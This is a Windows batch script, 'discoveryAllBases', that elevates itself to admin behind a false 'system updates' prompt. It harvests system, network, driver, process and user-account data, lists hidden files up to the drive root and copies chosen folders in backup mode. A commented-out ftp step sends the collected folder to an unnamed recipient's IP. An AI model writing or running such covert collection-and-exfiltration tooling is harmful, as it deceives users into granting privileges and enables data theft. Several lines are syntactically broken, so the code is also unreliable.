@echo off
title discoveryAllBases
echo Author: Cam

echo________________________________████____________________________________________________
echo__________________________████████████__________________________________________________
echo__________________________██████__██████____________________██__________________________
echo____________________________██████████████______________████____________________________
echo________________________________████████████____________██████__________________________
echo____________________________________████████████████████████████________________________
echo______________________________██████████████████████████████____________________________
echo________________________________██__██████████████████████████__________________________
echo______________________________________██__██████████████████████________________________
echo________________________________██████______████████████████████________________________
echo______________________________██████______________██______██████________________________
echo________________________________██____________████______████████________________________
echo____________________________________________████__██____██████__________________________
echo______________________________________________________████████__________________________
echo____________________________________________________████████____________________________
echo__________________________________________________████████______________________________
echo____________________________________________████████████________________________________
echo______________________________________████████████______________________________________


goto :main

:copyOver
  set exInfoTempBase= %tempBase%
  set exInfoTempBaseD= %tempBase%
  :repeatCopy
  set /p typeOfThing= "Do you want to go into a dir or copy it all? (dir/copy): "
  set /p response="Type the folder/file name you want: "
  set exInfoTempBaseD= %exInfoTempBaseD%\%response%

  if %typeOfThing%==copy(
    robocopy %exInfoTempBase% %homeBase%\Info\directories\ExtraContent %response% /b /s
    set exInfoTempBase= %tempBase%
  )

  if %typeOfThing%==dir(
    cd %exInfoTempBaseD%
    echo %exInfoTempBaseD% - Regular Files
    tree /f
    echo %exInfoTempBaseD% - Hidden files
    dir /ah
    set %exInfoTempBase%= %exInfoTempBaseD%
    goto :repeatCopy
  )
  exit /b 0

:main

::first it takes the path to the starting directory as the homebase
for /f "delims=" in ('cd') do @set homeBaseTemp=%%a

::this takes in an input when starting the file,
set homeBase= %1

this command tests if user has admin privilliges
net file>nul 2>nul
if '%errorlevel%' neq '0'(
  ::there is an error code so the if statement runs, asking for admin privilliges
  echo requesting admin privileges for system updates.
  ::from here it starts the file again with the homeBase dir that was set prior
  echo(
      powershell.exe -Command "Start-Process '%~f0' %HomeBaseTemp% -Verb RunAs"
      exit /B
)

::it then moves into the previously set dir
cd %homeBase%

::now it makes a folder in that dir
md Info

::now it makes another folder and some blank files to put things in
md %homeBase%\Info\directories
md %homeBase%\Info\directories\Contents
md %homeBase%\Info\directories\Attributes
md %homeBase%\Info\Net
md %homeBase%\Info\directories\ExtraContent


::these find basic info about the computer and put it into a txt file called Basics
echo Version Info- > Info\basics.txt
ver >> Info\Basics.txt

echo System Info- >> Info\basics.txt
systeminfo >> Info\basics.txt

echo IPconfig Info- >> Info\basics.txt
ipconfig >> >> Info\basics.txt

driverquery > %homeBase%\Info\drivers.txt
tasklist > %homeBase%\Info\tasks.txt
subst > %homeBase%\Info\subst.txt

net users > %homeBase%\Info\Net\users.txt
net accounts > %homeBase%\Info\Net\accounts.txt
net config > %homeBase%\Info\Net\config.txt
net session > %homeBase%\Info\Net\session.txt



::this is a loop where it goes through each directory from the intial to the farthest back and grabs the contents

:start
for /f "delims=" %%a in ('cd') do @set tempBase=%%a
set tempBase= %tempBase:\=_%
set tempBase=%currDir::=!%
dir > %homeBase%\Info\directories\Contents\%tempBase%.txt
dir /ah > %homeBase%\Info\directories\Contents\%tempBase%.txt
attrib > %homeBase%\Info\directories\Attributes\%tempBase%Attribute.txt

:stillCopying
echo %tempBase% - Regular Files
tree /f
echo %tempBase% - Hidden files
dir /ah
set wantContent="n"
set /p wantContent="Do you want the contents of one of these folders (y/n): "

if %wantContent%==y (
  call:copyOver
  goto stillCopying
)

pause
cd ..

::once its at the furthest back dir it will stop
if not %tempBase%==C!_ (
    set tempBase=
    goto start
)

::ftp (insert intended recipient for folder of info's ip)
::put %homeBase%\Info


goto :EOF
